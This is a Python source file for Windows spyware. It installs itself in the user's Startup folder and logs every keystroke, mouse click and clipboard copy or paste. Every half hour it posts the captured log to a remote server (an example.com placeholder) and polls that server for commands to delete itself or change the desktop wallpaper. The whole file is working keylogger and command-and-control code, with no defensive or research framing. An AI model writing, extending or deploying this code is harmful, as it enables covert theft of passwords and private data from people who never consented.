import ctypes
from ctypes import wintypes
from pynput import keyboard, mouse
import threading
import time
import pyperclip
import requests
import os
import sys
import subprocess
import shutil

def add_to_startup():
    # current exe path
    current_exe = sys.executable

    # user's Startup folder path
    startup_dir = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

    # program exe name
    exe_name = os.path.basename(current_exe)

    # target path
    target_path = os.path.join(startup_dir, exe_name)

    # if program is not in Startup already and doesn't exists in there
    if os.path.abspath(current_exe) != os.path.abspath(target_path):
        if not os.path.exists(target_path):
            shutil.copy2(current_exe, target_path)


if __name__ == "__main__":
    add_to_startup()
    user32 = ctypes.WinDLL('user32', use_last_error=True)

    GetKeyboardState = user32.GetKeyboardState
    GetKeyboardState.argtypes = [ctypes.POINTER(ctypes.c_uint8*256)]
    GetKeyboardState.restype = wintypes.BOOL

    ToUnicodeEx = user32.ToUnicodeEx
    ToUnicodeEx.argtypes = [wintypes.UINT, wintypes.UINT, ctypes.POINTER(ctypes.c_uint8*256),
                            ctypes.c_wchar_p, ctypes.c_int, wintypes.UINT, wintypes.HKL]
    ToUnicodeEx.restype = ctypes.c_int

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowThreadProcessId = user32.GetWindowThreadProcessId
    GetKeyboardLayout = user32.GetKeyboardLayout

    log = ""
    duration = 1800  # half an hour

    shift_pressed = False
    caps_pressed = False
    last_clipboard = pyperclip.paste()  # first clipboard status

    def self_delete():
        exe_path = os.path.abspath(sys.executable)

        bat_path = os.path.join(os.environ["TEMP"], "del_self.bat")

        with open(bat_path, "w") as f:
            f.write(f"""
        @echo off
        timeout /t 2 > nul
        del "{exe_path}"
        del "%~f0"
        """)

            subprocess.Popen([bat_path], shell=True)
            sys.exit()

    def set_wallpaper(image_path):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

    def download_image(url, save_path):
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(save_path, "wb") as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)
            return True
        return False

    def key_to_char(vk_code):
        state = (ctypes.c_uint8 * 256)()
        GetKeyboardState(ctypes.byref(state))

        if shift_pressed:
            state[0x10] = 0x80
        if caps_pressed:
            state[0x14] = 0x01

        buf = ctypes.create_unicode_buffer(8)

        hwnd = GetForegroundWindow()
        tid = GetWindowThreadProcessId(hwnd, 0)
        klid = GetKeyboardLayout(tid)

        res = ToUnicodeEx(vk_code, 0, state, buf, 8, 0, klid)
        if res > 0:
            return buf.value
        return ''

    def check_clipboard():
        global log, last_clipboard
        while True:
            time.sleep(0.2)
            try:
                clip = pyperclip.paste()
                if clip != last_clipboard:
                    if len(clip) > len(last_clipboard):
                        log += f"\n[COPIED]: {clip}"
                    else:
                        log += f"\n[PASTED]: {clip}"
                    last_clipboard = clip
            except Exception:
                pass

    def on_press(key):
        global log, shift_pressed, caps_pressed

        if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            shift_pressed = True
            return
        if key == keyboard.Key.caps_lock:
            caps_pressed = not caps_pressed
            return

        try:
            vk = key.vk
            char = key_to_char(vk)
            if char:
                log += char
            else:
                log += f"[{key}]"
        except AttributeError:
            log += f"[{key}]"

    def on_release(key):
        global shift_pressed
        if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
            shift_pressed = False

    def on_click(x, y, button, pressed):
        global log
        if pressed:
            log += f"[Mouse-{button}]"

    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_click=on_click)

    keyboard_listener.start()
    mouse_listener.start()

    # Thread جدا برای بررسی clipboard
    threading.Thread(target=check_clipboard, daemon=True).start()

    def stop_recording():
        global log
        while True:
            time.sleep(1800)

            if log:   # if there was anything inside "log"
                try:
                    requests.post(
                        "https://example.com/echo.php",
                        json={"message": log}
                    )
                    log = ""   # empty log after sending
                except:
                    pass
            try:
                #taking commands from address
                r = requests.get("https://example.com/command.php", timeout=5)

                if "DELETE" in r.text:
                    print("Deleting...")
                    self_delete()

                if "CHANGE" in r.text:
                    image_url = "https://example.com/bg.jpg"
                    save_path = os.path.join(os.getcwd(), "bg.jpg")
                    if download_image(image_url, save_path):
                        set_wallpaper(save_path)
                        time.sleep(2)
                        os.remove(save_path)

            except:
                pass


    threading.Thread(target=stop_recording).start()